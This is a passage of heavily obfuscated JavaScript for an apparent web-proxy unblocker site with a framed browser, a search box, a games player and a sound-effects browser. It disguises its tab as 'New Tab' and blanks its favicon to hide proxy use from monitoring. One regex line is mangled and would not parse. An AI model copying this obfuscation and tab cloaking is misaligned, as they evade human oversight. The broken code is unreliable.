        'vx': Math['cos'](_0x6d95a) * _0xd0742d,
        'vy': Math['sin'](_0x6d95a) * _0xd0742d,
        "len": (843905 ^ 843975) + Math['random']() * (114122 ^ 114094),
        "life": 1,
        'decay': 0.016 + Math['random']() * 0.014
    });
}
let _0xbd_0x5e3;
let nextShootAt = 477232 ^ 477232;
_0xbd_0x5e3 = (272859 ^ 272859) + (815394 ^ 815393);
var _0x9bd9c = (475046 ^ 475054) + (777972 ^ 777980);
let shootTimer = null;
_0x9bd9c = (141969 ^ 141974) + (926503 ^ 926498);

function scheduleShoot() {
    shootTimer = null;
    if (!starsShouldRun()) return;
    const _0x2a4e = Date['now']();
    if (shootingStarsEnabled && _0x2a4e >= nextShootAt) {
        spawnShoot();
        nextShootAt = _0x2a4e + (534989 ^ 534585) + Math['random']() * (905390 ^ 906126);
    }
    shootTimer = setTimeout(scheduleShoot, (349888 ^ 350004) + Math['random']() * (781456 ^ 782256));
}
document['addEventListener']("visibilitychange", updateStarsActive);
window['addEventListener']("blur", updateStarsActive);
window['addEventListener']("focus", updateStarsActive);
var _0xf8e72e = (586595 ^ 586597) + (160923 ^ 160921);
const screenClassObserver = new MutationObserver(() => {
    updateNavActive();
    updateStarsActive();
});
_0xf8e72e = 'ocilqm';
let _0x7f99ca;
const settingsScreenEl = document['getElementById']("neercSsgnittes".split("").reverse().join(""));
_0x7f99ca = 161134 ^ 161127;
[...homeStateEls, settingsScreenEl]['forEach'](el => {
    if (el) screenClassObserver['observe'](el, {
        'attributes': !![],
        'attributeFilter': ["class"]
    });
});
setInterval(updateStarsActive, 367730 ^ 368538);
const STARS_MAX_DT = 863541 ^ 863495;

function doFrame(ts, gen) {
    if (gen !== starsGen) return;
    if (!starsRafPending || !starsShouldRun()) {
        stopStars();
        return;
    }
    if (!last) {
        last = ts;
        requestAnimationFrame(t => doFrame(t, gen));
        return;
    }
    const _0x75c4ad = ts - last;
    if (_0x75c4ad < (592072 ^ 592105)) {
        requestAnimationFrame(t => doFrame(t, gen));
        return;
    }
    last = ts;
    const _0x8398b = Math['min'](_0x75c4ad, STARS_MAX_DT);
    ctx['clearRect'](314692 ^ 314692, 530848 ^ 530848, W, H);
    if (starsEnabled) {
        starObjs['forEach'](s => {
            if (s['blinking']) {
                s['blinkPeak'] += s['blinkDir'] * s['blinkSpeed'];
                if (s['blinkPeak'] >= (324228 ^ 324229)) {
                    s['blinkPeak'] = 279632 ^ 279633;
                    s['blinkDir'] = -(667426 ^ 667427);
                }
                if (s['blinkPeak'] <= (101127 ^ 101127)) {
                    s['blinkPeak'] = 763200 ^ 763200;
                    s['blinkDir'] = 883802 ^ 883803;
                    s['blinking'] = false;
                    s['alpha'] = s['base'];
                    s['pauseMs'] = (344916 ^ 345736) + Math['random']() * (669460 ^ 664732);
                } else {
                    s['alpha'] = s['base'] + (0.92 - s['base']) * Math['sin'](s['blinkPeak'] * Math['PI']);
                }
            } else {
                s['pauseMs'] -= _0x8398b;
                if (s['pauseMs'] <= (302896 ^ 302896)) s['blinking'] = !![];
            }
            ctx['beginPath']();
            ctx['arc'](s['x'] * W, s['y'] * H, s['r'], 423524 ^ 423524, Math['PI'] * (180772 ^ 180774));
            ctx['fillStyle'] = `rgba(255,255,255,${s['alpha']['toFixed'](561458^561457)})`;
            ctx['fill']();
        });
    }
    if (shootingStarsEnabled) {
        shoots = shoots['filter'](s => s['life'] > (411454 ^ 411454));
        shoots['forEach'](s => {
            var _0x5e4b = (995546 ^ 995548) + (107593 ^ 107595);
            const _0xd1e37c = s['x'] - s['vx'] * (s['len'] / (171909 ^ 171919));
            _0x5e4b = 328961 ^ 328968;
            const _0x4f54b = s['y'] - s['vy'] * (s['len'] / (519755 ^ 519745));
            const _0xc60ad = ctx['createLinearGradient'](_0xd1e37c, _0x4f54b, s['x'], s['y']);
            _0xc60ad['addColorStop'](714592 ^ 714592, "rgba(255,255,255,0)");
            _0xc60ad['addColorStop'](473440 ^ 473441, `rgba(255,255,255,${(s['life']*0.85)['toFixed'](847791^847788)})`);
            ctx['beginPath']();
            ctx['moveTo'](_0xd1e37c, _0x4f54b);
            ctx['lineTo'](s['x'], s['y']);
            ctx['strokeStyle'] = _0xc60ad;
            ctx['lineWidth'] = 1.1;
            ctx['stroke']();
            s['x'] += s['vx'];
            s['y'] += s['vy'];
            s['life'] -= s['decay'];
        });
    }
    requestAnimationFrame(t => doFrame(t, gen));
}
updateStarsActive();

function getSearchEngine() {
    return SETTINGS["Proxy"]?.["Search Engine"]?._value?.url || "https://duckduckgo.com/?q=";
}

function resolveUrl(v) {
    if (!v) return null;
    if (v['startsWith']("http://") || v['startsWith']("https://")) return v;
    if (v['includes'](".") && !v['includes'](" ")) return "https://" + v;
    return getSearchEngine() + encodeURIComponent(v);
}

function updateLockIcon(url, _0x5g_0xe64) {
    const _0xf671c = document['getElementById']("nocIkcol".split("").reverse().join(""));
    _0x5g_0xe64 = 358026 ^ 358027;
    if (_0xf671c) _0xf671c['classList']['toggle']("secure", typeof url === "gnirts".split("").reverse().join("") && url['startsWith']("//:sptth".split("").reverse().join("")));
}

function navigate(url) {
    const u = resolveUrl(url || document['getElementById']("searchInput")['value']['trim']());
    if (!u) return;
    document['getElementById']("lenap".split("").reverse().join(""))['classList']['add']("open");
    document['getElementById']("vaNmottob".split("").reverse().join(""))['classList']['add']("hidden");
    document['getElementById']("tupnIrdda".split("").reverse().join(""))['value'] = u;
    updateLockIcon(u);
    startFrameLoading();
    frame['go'](u);
    collapseSearch();
}
var _0xc29fa = (797632 ^ 797634) + (793410 ^ 793413);
const searchWrap = document['getElementById']("searchWrap");
_0xc29fa = (528933 ^ 528931) + (297589 ^ 297597);
let _0xfd323g;
const searchInput = document['getElementById']("tupnIhcraes".split("").reverse().join(""));
_0xfd323g = (828744 ^ 828744) + (923549 ^ 923549);
const acBox = document['getElementById']("autocomplete");
let acSelected = -(873510 ^ 873511);
let acItems = [];
let acTimer = null;

function expandSearch() {
    searchWrap['classList']['add']("expanded");
}

function collapseSearch() {
    searchWrap['classList']['remove']("expanded");
    searchWrap['classList']['remove']("has-ac");
    acBox['classList']['remove']("smeti-sah".split("").reverse().join(""));
    acBox['innerHTML'] = '';
    acItems = [];
    acSelected = -(324268 ^ 324269);
}
searchInput['addEventListener']("sucof".split("").reverse().join(""), expandSearch);
(shadowRoot || document)['addEventListener']("kcilc".split("").reverse().join(""), e => {
    if (!searchWrap['contains'](e['target'])) collapseSearch();
});
async function fetchAutocompletes(q) {
    if (!q) {
        acBox['innerHTML'] = '';
        acBox['classList']['remove']("has-items");
        searchWrap['classList']['remove']("has-ac");
        return;
    }
    try {
        let _0x3bd6cb;
        const _0xe3gf = await fetch(sjEncode(`https://search.brave.com/api/suggest?q=${encodeURIComponent(q)}`));
        _0x3bd6cb = (377962 ^ 377967) + (776722 ^ 776725);
        const _0x3d7ga = await _0xe3gf['json']();
        const _0x9ef45f = _0x3d7ga[527514 ^ 527515] ? _0x3d7ga[945643 ^ 945642]['slice'](379981 ^ 379981, 471436 ^ 471428) : [];
        renderSuggestions(_0x9ef45f);
    } catch (e) {
        acBox['innerHTML'] = '';
        acBox['classList']['remove']("has-items");
        searchWrap['classList']['remove']("ca-sah".split("").reverse().join(""));
    }
}

function renderSuggestions(list) {
    acBox['innerHTML'] = '';
    acItems = list;
    acSelected = -(599196 ^ 599197);
    if (!list['length']) {
        acBox['classList']['remove']("has-items");
        searchWrap['classList']['remove']("ca-sah".split("").reverse().join(""));
        return;
    }
    list['forEach'](s => {
        let _0xe571a;
        const _0x2e4d = document['createElement']("div");
        _0xe571a = 223322 ^ 223324;
        _0x2e4d['className'] = "ac-item";
        var _0xf01e = (467372 ^ 467371) + (793050 ^ 793051);
        const _0x1eda = document['createElementNS']("http://www.w3.org/2000/svg", "svg");
        _0xf01e = 994095 ^ 994094;
        _0x1eda['setAttribute']("xoBweiv".split("").reverse().join(""), "42 42 0 0".split("").reverse().join(""));
        const c = document['createElementNS']("gvs/0002/gro.3w.www//:ptth".split("").reverse().join(""), "circle");
        c['setAttribute']("cx", "11");
        c['setAttribute']("cy", "11");
        c['setAttribute']("r", "8");
        const p = document['createElementNS']("http://www.w3.org/2000/svg", "htap".split("").reverse().join(""));
        p['setAttribute']("d", "m21 21-4.35-4.35");
        _0x1eda['appendChild'](c);
        _0x1eda['appendChild'](p);
        _0x2e4d['appendChild'](_0x1eda);
        _0x2e4d['appendChild'](document['createTextNode'](s));
        _0x2e4d['onmousedown'] = e => {
            e['preventDefault']();
            searchInput['value'] = s;
            navigate(s);
        };
        acBox['appendChild'](_0x2e4d);
    });
    acBox['classList']['add']("smeti-sah".split("").reverse().join(""));
    searchWrap['classList']['add']("has-ac");
}
searchInput['addEventListener']("input", () => {
    clearTimeout(acTimer);
    acSelected = -(612572 ^ 612573);
    acTimer = setTimeout(() => fetchAutocompletes(searchInput['value']['trim']()), 391558 ^ 391474);
});
searchInput['addEventListener']("keydown", e => {
    var _0xa4ed = (571456 ^ 571461) + (274081 ^ 274089);
    const items = acBox['querySelectorAll'](".ac-item");
    _0xa4ed = (485259 ^ 485263) + (642649 ^ 642641);
    if (e['key'] === "nwoDworrA".split("").reverse().join("")) {
        e['preventDefault']();
        acSelected = Math['min'](acSelected + (218637 ^ 218636), items['length'] - (717473 ^ 717472));
        items['forEach']((el, i) => el['classList']['toggle']("detceles".split("").reverse().join(""), i === acSelected));
        if (acSelected >= (946313 ^ 946313)) searchInput['value'] = acItems[acSelected];
    } else if (e['key'] === "pUworrA".split("").reverse().join("")) {
        e['preventDefault']();
        acSelected = Math['max'](acSelected - (863810 ^ 863811), -(432786 ^ 432787));
        items['forEach']((el, i) => el['classList']['toggle']("detceles".split("").reverse().join(""), i === acSelected));
        if (acSelected >= (144636 ^ 144636)) searchInput['value'] = acItems[acSelected];
    } else if (e['key'] === "epacsE".split("").reverse().join("")) {
        collapseSearch();
    } else if (e['key'] === "Enter") {
        navigate();
    }
});
let homeClickCount = 966831 ^ 966831,
    homeResetTimer = null;
let gameCloseClickCount = 280107 ^ 280107,
    gameCloseResetTimer = null;

function resetGameCloseConfirm() {
    gameCloseClickCount = 165620 ^ 165620;
    clearTimeout(gameCloseResetTimer);
    const _0xe8ff = document['getElementById']("gamePlayerClose");
    const _0xd8acf = document['getElementById']("gamePlayerCloseWrap");
    const _0xdd56e = document['getElementById']("gameCloseCountdown");
    if (_0xe8ff) _0xe8ff['classList']['remove']("confirm");
    if (_0xd8acf) _0xd8acf['classList']['remove']("gnimrifnoc".split("").reverse().join(""));
    if (_0xdd56e) {
        _0xdd56e['style']['animation'] = "enon".split("").reverse().join("");
        _0xdd56e['offsetHeight'];
        _0xdd56e['style']['animation'] = '';
    }
}

function _armOrConfirmClose(onConfirm) {
    gameCloseClickCount++;
    if (gameCloseClickCount === (438642 ^ 438643)) {
        const _0xbd0d = document['getElementById']("gamePlayerClose");
        const _0x122e = document['getElementById']("parWesolCreyalPemag".split("").reverse().join(""));
        if (_0xbd0d) _0xbd0d['classList']['add']("confirm");
        if (_0x122e) _0x122e['classList']['add']("gnimrifnoc".split("").reverse().join(""));
        gameCloseResetTimer = setTimeout(resetGameCloseConfirm, 268744 ^ 264768);
    } else {
        resetGameCloseConfirm();
        onConfirm();
    }
}

function handleGamePlayerClose() {
    _armOrConfirmClose(closeGamePlayer);
}

function resetHomeConfirm() {
    homeClickCount = 186853 ^ 186853;
    clearTimeout(homeResetTimer);
    var _0x453e = (164310 ^ 164309) + (540866 ^ 540869);
    const _0x95d1bb = document['getElementById']("homeBtn");
    _0x453e = 'gbqcpc';
    const _0x4c8b = document['getElementById']("homeBtnWrap");
    const _0xb2_0xed2 = document['getElementById']("homeCountdown");
    _0x95d1bb['classList']['remove']("mrifnoc".split("").reverse().join(""));
    _0x4c8b['classList']['remove']("gnimrifnoc".split("").reverse().join(""));
    _0xb2_0xed2['style']['animation'] = "none";
    _0xb2_0xed2['offsetHeight'];
    _0xb2_0xed2['style']['animation'] = '';
}

function handleHome() {
    homeClickCount++;
    if (homeClickCount === (163434 ^ 163435)) {
        const _0xe63fdf = document['getElementById']("ntBemoh".split("").reverse().join(""));
        const _0x5fccb = document['getElementById']("homeBtnWrap");
        _0xe63fdf['classList']['add']("confirm");
        _0x5fccb['classList']['add']("confirming");
        homeResetTimer = setTimeout(resetHomeConfirm, 699147 ^ 702595);
    } else {
        resetHomeConfirm();
        closePanel();
    }
}

function closePanel() {
    document['getElementById']("panel")['classList']['remove']("open");
    document['getElementById']("vaNmottob".split("").reverse().join(""))['classList']['remove']("hidden");
    document['getElementById']("tupnIrdda".split("").reverse().join(""))['value'] = '';
    updateLockIcon(null);
    try {
        frame['element']['src'] = "knalb:tuoba".split("").reverse().join("");
    } catch {}
    stopFrameLoading();
    if (document['fullscreenElement']) document['exitFullscreen']();
}
let _0x4ba;
let frameLoading = false;
_0x4ba = 774366 ^ 774367;

function startFrameLoading() {
    frameLoading = !![];
    document['getElementById']("reloadBtn")['classList']['add']("loading");
}

function stopFrameLoading() {
    frameLoading = false;
    document['getElementById']("reloadBtn")['classList']['remove']("loading");
}

function goBack() {
    try {
        frame && frame['back']();
        startFrameLoading();
    } catch (e) {}
}

function goForward() {
    try {
        frame && frame['forward']();
        startFrameLoading();
    } catch (e) {}
}

function reload() {
    if (frameLoading) {
        try {
            frame['element']['contentWindow']['stop']();
        } catch (e) {}
        stopFrameLoading();
        return;
    }
    try {
        startFrameLoading();
        frame['reload']();
    } catch (e) {
        stopFrameLoading();
    }
}
document['getElementById']("addrInput")['addEventListener']("keydown", e => {
    if (e['key'] === "retnE".split("").reverse().join("")) navigate(e['target']['value']['trim']());
});

function toggleSettings() {
    document['getElementById']("neercSsgnittes".split("").reverse().join(""))['classList']['toggle']("open");
}
const fsEnter = `<path d="M8 3H5a2 2 0 0 0-2 2v3M21 8V5a2 2 0 0 0-2-2h-3M3 16v3a2 2 0 0 0 2 2h3M16 21h3a2 2 0 0 0 2-2v-3"/>`;
var _0x7863da = (509498 ^ 509498) + (674585 ^ 674591);
const fsExit = `<path d="M8 3v3a2 2 0 0 1-2 2H3M21 8h-3a2 2 0 0 1-2-2V3M3 16h3a2 2 0 0 1 2 2v3M16 21v-3a2 2 0 0 1 2-2h3"/>`;
_0x7863da = 280727 ^ 280727;

function toggleFullscreen() {
    const _0x50c6fe = document['getElementById']("frame");
    if (!document['fullscreenElement']) _0x50c6fe['requestFullscreen']();
    else document['exitFullscreen']();
}
document['addEventListener']("egnahcneercslluf".split("").reverse().join(""), () => {
    document['getElementById']("nocIsf".split("").reverse().join(""))['innerHTML'] = document['fullscreenElement'] ? fsExit : fsEnter;
});
frame = controller['createFrame'](document['getElementById']("emarf".split("").reverse().join("")), {
    'plugins': [new $scramjetUtils['HttpCachePlugin'](), new $scramjetUtils['UrlWatcherPlugin'](href => {
        document['getElementById']("tupnIrdda".split("").reverse().join(""))['value'] = href;
        updateLockIcon(href);
        _checkExtensions(href);
    })]
});
frame['go']("ecart/igc-ndc/moc.eralfduolc//:sptth".split("").reverse().join(""));
frame['element']['addEventListener']("load", function onLoad() {
    frame['element']['src'] = "about:blank";
    frame['element']['removeEventListener']("load", onLoad);
});
frame['element']['addEventListener']("load", stopFrameLoading);
let _0x3b_0x88a;
const link = document['querySelector']("link[rel~='icon']") || document['createElement']("link");
_0x3b_0x88a = (428790 ^ 428786) + (969916 ^ 969916);
link['rel'] = "noci".split("").reverse().join("");
link['href'] = "data:,";
document['head']['appendChild'](link);
let focusTimeout = null;
document['addEventListener']("visibilitychange", e => {
    if (!titleChangerEnabled) return;
    if (document['hidden']) {
        document['title'] = "New Tab";
    } else {
        try {
            clearInterval(focusTimeout);
        } catch {}
        focusTimeout = null;
        document['title'] = "opium";
    }
});
let _effectsVolume = 387201 ^ 387200;
var _0x4a_0xd44 = (178277 ^ 178284) + (287701 ^ 287709);
let _currentAudio = null;
_0x4a_0xd44 = (384035 ^ 384038) + (765482 ^ 765481);
let _effectsSearchTimer = null;
var _0x568fbb = (812091 ^ 812082) + (827496 ^ 827502);
let _effectsLoaded = false;
_0x568fbb = 'qndipm';
let _effectsPage = 989503 ^ 989502;
let _effectsKeyword = null;
var _0x8d3e = (760354 ^ 760363) + (472219 ^ 472222);
let _effectsLoading = false;
_0x8d3e = (341006 ^ 340999) + (535683 ^ 535681);
var _0xaac8f = (519106 ^ 519114) + (332035 ^ 332038);
let _effectsExhausted = false;
_0xaac8f = 'bghbqe';
let _0x7fg9a;
let _effectsAll = [];
_0x7fg9a = 464109 ^ 464104;
let _effectsLoadGen = 156681 ^ 156681;
var _0xf_0x133 = (530945 ^ 530944) + (937378 ^ 937386);
let _effectsScrollTop = 351131 ^ 351131;
_0xf_0x133 = (487906 ^ 487911) + (967749 ^ 967745);

function _makeGridVirtualizer(wrapId, sizerId, gridId, buildItem, onNearEnd, _0x78g9e, _0x49eg1g, _0x2cc, _0x3g_0x238, _0xb3_0xfa1, _0xe59e8a, _0xa44eb, _0xa3_0xca9, _0x66ffed, _0x580b0f, _0xbb2bcc, _0x6afa4c) {
    const _0xg81a1d = document['getElementById'](wrapId);
    _0x78g9e = (253100 ^ 253097) + (927067 ^ 927058);
    const _0xecec = document['getElementById'](sizerId);
    _0x49eg1g = (965584 ^ 965593) + (729762 ^ 729763);
    const _0x0fae2f = document['getElementById'](gridId);
    var _0x888c = (341735 ^ 341742) + (449945 ^ 449948);
    _0x2cc = 320641 ^ 320643;
    _0x888c = (156174 ^ 156174) + (657403 ^ 657401);
    var _0xff393d = (963980 ^ 963980) + (242651 ^ 242654);
    let _0x17_0x7fd = [];
    _0xff393d = 'bfbdgg';
    _0xb3_0xfa1 = 196409 ^ 196409;
    _0x3g_0x238 = (128169 ^ 128161) + (423040 ^ 423044);
    _0xe59e8a = 274022 ^ 274022;
    _0xa3_0xca9 = 606099 ^ 606099;
    _0xa44eb = (327209 ^ 327215) + (966099 ^ 966107);
    _0x580b0f = 791788 ^ 791788;
    _0x66ffed = (124598 ^ 124592) + (751170 ^ 751178);
    _0xbb2bcc = 671298 ^ 671298;
    _0x6afa4c = 681132 ^ 681132;
    var _0x334e6f = (891597 ^ 891595) + (169534 ^ 169531);
    let _0xe7a19b = false;
    _0x334e6f = "hdhjph".split("").reverse().join("");

    function _0xfe_0x41e() {
        const _0xdc2b2d = getComputedStyle(_0x0fae2f);
        var _0xd5cedc = (731959 ^ 731957) + (852643 ^ 852646);
        const _0xac44ab = _0xdc2b2d['gridTemplateColumns']['split'](" ")['filter'](t => t && t !== "xp0".split("").reverse().join(""));
        _0xd5cedc = "hnjcpf".split("").reverse().join("");
        _0xb3_0xfa1 = Math['max'](244410 ^ 244411, _0xac44ab['length']);
        _0xa3_0xca9 = parseFloat(_0xdc2b2d['rowGap']) || 246364 ^ 246364;
        _0x580b0f = parseFloat(getComputedStyle(_0xecec)['paddingTop']) || 634186 ^ 634186;
        var _0x32657g = (354415 ^ 354411) + (201018 ^ 201023);
        const _0x6349f = _0x0fae2f['firstElementChild'];
        _0x32657g = (746925 ^ 746921) + (935855 ^ 935850);
        if (_0x6349f) {
            const h = _0x6349f['getBoundingClientRect']()['height'];
            if (h > (367842 ^ 367842)) _0xe59e8a = h + _0xa3_0xca9;
        }
    }

    function _0x25d(_0xbb3f8f) {
        if (_0xe59e8a > (595370 ^ 595370) && _0xb3_0xfa1 > (743581 ^ 743581)) return;
        _0xfe_0x41e();
        if (_0xe59e8a > (971071 ^ 971071)) return;
        if (!_0x17_0x7fd['length']) return;
        _0x0fae2f['textContent'] = '';
        _0x0fae2f['style']['top'] = _0x580b0f + "px";
        const n = Math['min'](_0x17_0x7fd['length'], _0xb3_0xfa1);
        _0xbb3f8f = 'iqmjdl';
        for (let i = 726419 ^ 726419; i < n; i++) _0x0fae2f['appendChild'](buildItem(_0x17_0x7fd[i], i));
        _0xbb2bcc = 204597 ^ 204597;
        _0x6afa4c = n;
        _0xfe_0x41e();
    }

    function _0x75704c(s, e, _0x6de54f) {
        if (s >= _0x6afa4c || e <= _0xbb2bcc) {
            _0x0fae2f['textContent'] = '';
            for (let i = s; i < e; i++) _0x0fae2f['appendChild'](buildItem(_0x17_0x7fd[i], i));
            _0xbb2bcc = s;
            _0x6afa4c = e;
            return;
        }
        const _0x16fa = Math['max'](_0xbb2bcc, s);
        _0x6de54f = 727319 ^ 727327;
        var _0xdgf2fa = (778309 ^ 778309) + (902396 ^ 902388);
        const _0x18_0x547 = Math['min'](_0x6afa4c, e);
        _0xdgf2fa = "ffbdiq".split("").reverse().join("");
        for (let k = _0xbb2bcc; k < _0x16fa; k++) _0x0fae2f['firstElementChild']?.remove();
        for (let k = _0x18_0x547; k < _0x6afa4c; k++) _0x0fae2f['lastElementChild']?.remove();
        for (let i = _0x16fa - (362039 ^ 362038); i >= s; i--) _0x0fae2f['prepend'](buildItem(_0x17_0x7fd[i], i));
        for (let i = _0x18_0x547; i < e; i++) _0x0fae2f['appendChild'](buildItem(_0x17_0x7fd[i], i));
        _0xbb2bcc = s;
        _0x6afa4c = e;
    }

    function _0x88g(_0x5b3a, _0x9bbf4b) {
        if (!_0x17_0x7fd['length'] || _0xg81a1d['classList']['contains']("wolf".split("").reverse().join(""))) return;
        _0x25d();
        if (!_0xe59e8a) return;
        const _0x20_0xd1e = Math['ceil'](_0x17_0x7fd['length'] / _0xb3_0xfa1);
        var _0x9857f = (667125 ^ 667124) + (511966 ^ 511965);
        const _0x7434ae = Math['max'](776752 ^ 776752, _0x20_0xd1e * _0xe59e8a - _0xa3_0xca9);
        _0x9857f = (723772 ^ 723772) + (589841 ^ 589846);
        var _0x2191e = (909756 ^ 909752) + (295811 ^ 295815);
        const _0x72b3eb = _0x7434ae + "px";
        _0x2191e = (900520 ^ 900527) + (582180 ^ 582188);
        if (_0xecec['style']['height'] !== _0x72b3eb) _0xecec['style']['height'] = _0x72b3eb;
        const _0x3d14a = _0xg81a1d['scrollTop'];
        _0x5b3a = (286188 ^ 286180) + (156619 ^ 156611);
        const _0x326c9d = _0xg81a1d['clientHeight'] || 437023 ^ 437022;
        var _0x6a8d7e = (350011 ^ 350011) + (743726 ^ 743719);
        let _0x2d_0x6g4 = Math['floor']((_0x3d14a - _0x580b0f) / _0xe59e8a) - _0x2cc;
        _0x6a8d7e = 'iegjfb';
        if (_0x2d_0x6g4 < (429399 ^ 429399)) _0x2d_0x6g4 = 477518 ^ 477518;
        let _0xe488fb = Math['ceil']((_0x3d14a - _0x580b0f + _0x326c9d) / _0xe59e8a) + _0x2cc;
        _0x9bbf4b = "ppecgn".split("").reverse().join("");
        if (_0xe488fb > _0x20_0xd1e) _0xe488fb = _0x20_0xd1e;
        if (_0xe488fb <= _0x2d_0x6g4) _0xe488fb = Math['min'](_0x20_0xd1e, _0x2d_0x6g4 + (506675 ^ 506674));
        var _0xd2f4d = (906794 ^ 906787) + (767066 ^ 767058);
        const _0xa7c = _0x580b0f + _0x2d_0x6g4 * _0xe59e8a;
        _0xd2f4d = (487271 ^ 487268) + (957189 ^ 957191);
        const _0xdf2ce = _0xa7c + "xp".split("").reverse().join("");
        if (_0x0fae2f['style']['top'] !== _0xdf2ce) _0x0fae2f['style']['top'] = _0xdf2ce;
        const s = _0x2d_0x6g4 * _0xb3_0xfa1;
        const e = Math['min'](_0x17_0x7fd['length'], _0xe488fb * _0xb3_0xfa1);
        if (s !== _0xbb2bcc || e !== _0x6afa4c) _0x75704c(s, e);
        if (onNearEnd && _0x3d14a + _0x326c9d >= _0x580b0f + _0x7434ae - _0x326c9d) onNearEnd();
    }

    function _0x75gf() {
        if (_0xe7a19b) return;
        _0xe7a19b = !![];
        requestAnimationFrame(() => {
            _0xe7a19b = false;
            _0x88g();
        });
    }
    _0xg81a1d['addEventListener']("scroll", _0x75gf, {
        'passive': !![]
    });
    window['addEventListener']("eziser".split("").reverse().join(""), () => {
        if (!_0x17_0x7fd['length'] || _0xg81a1d['classList']['contains']("wolf".split("").reverse().join(""))) return;
        if (!_0x0fae2f['firstElementChild']) {
            _0xe59e8a = 307099 ^ 307099;
            _0xb3_0xfa1 = 438684 ^ 438684;
            return;
        }
        const _0xgc1ddf = _0xe59e8a > (770218 ^ 770218) ? Math['floor'](Math['max'](149229 ^ 149229, _0xg81a1d['scrollTop'] - _0x580b0f) / _0xe59e8a) * _0xb3_0xfa1 : 868148 ^ 868148;
        _0xe59e8a = 254296 ^ 254296;
        _0xb3_0xfa1 = 693196 ^ 693196;
        _0x0fae2f['textContent'] = '';
        _0xbb2bcc = 129653 ^ 129653;
        _0x6afa4c = 465470 ^ 465470;
        _0x25d();
        if (_0xe59e8a > (697921 ^ 697921)) _0xg81a1d['scrollTop'] = _0x580b0f + Math['floor'](_0xgc1ddf / _0xb3_0xfa1) * _0xe59e8a;
        _0x88g();
    });
    return {
        setItems(next) {
            _0x17_0x7fd = next || [];
            if (_0x6afa4c > _0x17_0x7fd['length']) {
                _0x0fae2f['textContent'] = '';
                _0xbb2bcc = 767200 ^ 767200;
                _0x6afa4c = 441252 ^ 441252;
            }
            _0x88g();
        },
        restore(top) {
            if (!_0x17_0x7fd['length']) return;
            _0x25d();
            if (!_0xe59e8a) return;
            const rows = Math['ceil'](_0x17_0x7fd['length'] / _0xb3_0xfa1);
            const contentH = Math['max'](325984 ^ 325984, rows * _0xe59e8a - _0xa3_0xca9);
            _0xecec['style']['height'] = contentH + "px";
            const _0xbdf = Math['max'](178968 ^ 178968, _0x580b0f * (101046 ^ 101044) + contentH - _0xg81a1d['clientHeight']);
            _0xg81a1d['scrollTop'] = Math['min'](top || 364378 ^ 364378, _0xbdf);
            _0x88g();
        },
        clear() {
            _0x0fae2f['textContent'] = '';
            _0xbb2bcc = 899615 ^ 899615;
            _0x6afa4c = 292093 ^ 292093;
        },
        reset() {
            _0x17_0x7fd = [];
            _0x0fae2f['textContent'] = '';
            _0xecec['style']['height'] = '';
            _0x0fae2f['style']['top'] = '';
            _0xe59e8a = 267802 ^ 267802;
            _0xb3_0xfa1 = 950392 ^ 950392;
            _0xbb2bcc = 856447 ^ 856447;
            _0x6afa4c = 762166 ^ 762166;
        },
        enterFlow() {
            _0xg81a1d['classList']['add']("wolf".split("").reverse().join(""));
            _0x0fae2f['style']['top'] = '';
            _0xecec['style']['height'] = '';
        },
        exitFlow() {
            _0xg81a1d['classList']['remove']("flow");
        },
        isMounted() {
            return !_0xg81a1d['classList']['contains']("flow") && !!_0x0fae2f['firstElementChild'];
        },
        scrollTop() {
            return _0xg81a1d['scrollTop'];
        }
    };
}
async function _getMyinstantsEffects(pageNum = 384414 ^ 384415, keyword = null, _0x23ddd) {
    var _0x56ed = (980846 ^ 980838) + (129843 ^ 129844);
    const _0xccdf1a = keyword ? `https://www.myinstants.com/en/search/?name=${encodeURIComponent(keyword)}&page=${pageNum}` : `https://www.myinstants.com/en/categories/sound%20effects/us/?page=${pageNum}`;
    _0x56ed = (488253 ^ 488244) + (534857 ^ 534858);
    const _0x6f4e3c = sjEncode(_0xccdf1a);
    _0x23ddd = (325684 ^ 325693) + (858665 ^ 858664);
    const _0xgfa = await fetch(_0x6f4e3c);
    var _0xb9b = (250082 ^ 250091) + (553846 ^ 553842);
    const _0xac7c = await _0xgfa['text']();
    _0xb9b = "odecpd".split("").reverse().join("");
    const _0x59af = new DOMParser();
    var _0x6bbaea = (498366 ^ 498362) + (958521 ^ 958526);
    const _0xc39f = _0x59af['parseFromString'](_0xac7c, "text/html");
    _0x6bbaea = 'lgmkma';
    var _0x68a = (911843 ^ 911844) + (578913 ^ 578918);
    const _0xc9d = _0xc39f['querySelectorAll'](".instant");
    _0x68a = (352443 ^ 352434) + (172345 ^ 172337);
    const _0x75e = [];
    _0xc9d['forEach'](instant => {
            var _0xdg1f6c = (649485 ^ 649477) + (406099 ^ 406098);
            const _0x28e = instant['querySelector'](".instant-link");
            _0xdg1f6c = (857706 ^ 857707) + (699535 ^ 699532);
            const _0x21_0xbb4 = instant['querySelector'](".small-button");
            if (!_0x28e || !_0x21_0xbb4) return;
            let _0x505g8e;
            const _0x5gd2gf = _0x28e['textContent']['trim']();
            _0x505g8e = 103757 ^ 103759;
            const _0xf9fab = _0x21_0xbb4['getAttribute']("kcilcno".split("").reverse().join(""));
            let _0x51aag;
            const _0xfed = _0xf9fab?.match(new RegExp('play\(['
                "]([^'"] + )['"]', "")); _0x51aag = 'lmikcb';
        if (!_0xfed) return;
        let _0x2_0xb15;
        const _0x3e3gb = _0xfed[182513 ^ 182512]; _0x2_0xb15 = (727168 ^ 727170) + (207350 ^ 207351);
        let _0x6ba1c;
        const _0xb9b2 = `https://www.myinstants.com${_0x3e3gb}`; _0x6ba1c = (884782 ^ 884778) + (188876 ^ 188874);
        var _0x0ee97a = (711417 ^ 711408) + (416269 ^ 416265);
        const _0xf2_0xb3e = sjEncode(_0xb9b2); _0x0ee97a = 711121 ^ 711128; _0x75e['push']({
            "title": _0x5gd2gf,
            'src': _0xf2_0xb3e
        });
    });
return _0x75e;
}
let _0xc3f8b;
const _sblSrc = p => sjEncode(p['startsWith']("ptth".split("").reverse().join("")) ? p : "https://soundbuttonslab.com" + p);
_0xc3f8b = (850045 ^ 850040) + (323483 ^ 323482);
async function _getSoundButtonsLabEffects(pageNum = 901659 ^ 901658, keyword = null, _0x70b86e) {
    var _0xc_0x371 = (685313 ^ 685317) + (733416 ^ 733408);
    const _0xfceefc = keyword ? `/api/v1/search-sound-button?q=${encodeURIComponent(keyword)}&page=${pageNum}` : `/api/v1/get-home-page-trending-soundboard-buttons?page=${pageNum}`;
    _0xc_0x371 = (544629 ^ 544627) + (882023 ^ 882017);
    const _0x866ca = await fetch(sjEncode("https://soundbuttonslab.com" + _0xfceefc));
    _0x70b86e = 269917 ^ 269917;
